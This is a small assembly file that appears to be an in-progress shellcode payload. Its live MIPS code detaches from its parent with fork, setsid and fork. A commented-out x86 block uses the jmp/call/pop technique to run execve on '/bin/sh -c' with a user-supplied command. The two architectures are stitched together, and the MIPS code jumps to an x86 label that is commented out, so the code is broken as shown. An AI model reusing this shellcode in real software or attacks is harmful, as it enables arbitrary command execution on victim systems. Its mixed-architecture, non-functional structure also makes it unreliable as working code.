#include <sys/syscall.h>

#define BINSH "/bin/sh\x00"
#define TACC "-c\x00\x00\x00\x00\x00\x00"

.globl main
.type main, @function

main:
    li $v0, SYS_fork
    syscall
    beq $v0, 0, setsid
    slti $a0, $zero, -1
    li $v0, SYS_exit
    syscall

setsid:
    li $v0, SYS_setsid
    syscall
    li $v0, SYS_fork
    syscall
    beq $v0, 0, forkexit
    slti $a0, $zero, -1
    li $v0, SYS_exit
    syscall

forkexit:
    // jmp pop_binsh

/*
ret1:
    pop ebx
    jmp pop_tacc

ret2:
    pop esi
    jmp pop_userinput

ret3:
    pop edi

binsh:
    xor eax, eax
    push eax
    push edi
    push esi
    push ebx
    mov ecx, esp
    xor edx, edx
    mov eax, SYS_execve
    int 0x80

exit:
    xor ebx, ebx
    mov eax, SYS_exit
    int 0x80

pop_binsh:
    call ret1
    .string BINSH

pop_tacc:
    call ret2
    .string TACC

pop_userinput:
    call ret3
*/
